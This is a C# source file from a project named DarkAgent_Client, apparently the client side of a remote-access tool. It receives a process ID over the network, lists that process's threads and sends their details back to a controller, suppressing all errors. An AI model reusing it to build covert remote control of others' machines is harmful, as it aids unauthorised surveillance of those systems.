using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Objects;
using System.Diagnostics;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_GetProcessThreads : ReceiveBasePacket
    {
        public R_GetProcessThreads(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        private int PID;
        public override void Read()
        {
            PID = ReadInteger();
        }

        public override void Run()
        {
            try
            {
                Process proc = Process.GetProcessById(PID);
                foreach (ProcessThread thread in proc.Threads)
                {
                    ProcessThreadInfo info = new ProcessThreadInfo();
                    info.PID = PID;

                    try{info.ID = thread.Id;}catch{}
                    try {info.WaitReason = thread.WaitReason.ToString(); }catch { }
                    try {info.Pritioity = (thread.PriorityBoostEnabled ? (byte)1 : (byte)0); }catch { }
                    try {info.PrivilegedProcessorTime = thread.PrivilegedProcessorTime.ToString(); }catch { }
                    try { info.StartTime = thread.StartTime.ToString();}catch { }
                    try { info.Threadstate = thread.ThreadState.ToString(); }catch { }

                    Client.SendPacket(new S_GetProcessThreads(Client, info));
                }
            }catch{}
        }
    }
}
